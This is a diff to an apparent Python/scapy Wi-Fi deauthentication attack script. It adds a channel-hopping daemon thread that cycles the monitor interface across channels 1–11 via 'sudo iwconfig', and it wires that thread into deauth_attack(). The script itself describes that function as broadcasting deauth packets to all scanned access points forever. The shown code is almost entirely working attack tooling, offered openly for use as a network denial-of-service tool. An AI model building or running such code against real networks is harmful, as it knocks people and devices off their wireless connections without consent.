@@ -24,7 +24,10 @@ channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]
 from scapy.all import *
 import subprocess
 
+import random
 import time
+
+from threading import Thread
        
 #-----------------------------------------------------------------------------------------------------    
 
@@ -154,6 +157,21 @@ FUNCTIONS.
 ATTACKS
 '''
 
+def channelhopper():
+    channel = 1
+    while channel < 12:
+        try:
+            subprocess.check_output("sudo iwconfig mon0 channel " + str(channel), shell=True)
+            time.sleep(0.2)
+        
+            if channel >= 11:
+                channel = 1
+                continue
+            
+            channel += 1
+        except: #sometimes iwconfig responds with an error, this is just to keep the chanhopper going if it happens
+            continue
+        
 #finally done, broadcasts deauth packets to all scanned aps forever whilst also channel hopping
 def deauth_attack():
     BROADCAST = "FF:FF:FF:FF:FF:FF"
@@ -165,6 +183,10 @@ def deauth_attack():
         verboselog=True
     else:
         verboselog=False
+        
+    chop = Thread(target=channelhopper, args=[]) #channel hopping daemon
+    chop.daemon = True
+    chop.start()
     
     input("BEGIN NETWORK DOS DEAUTH ATTACK?\nPRESS [ENTER]...")
     
@@ -191,4 +213,5 @@ if __name__ == "__main__":
     try:
         deauth_attack()
     except KeyboardInterrupt:
+        print("SHUTDOWN REQUESTED...")
         cleanup()
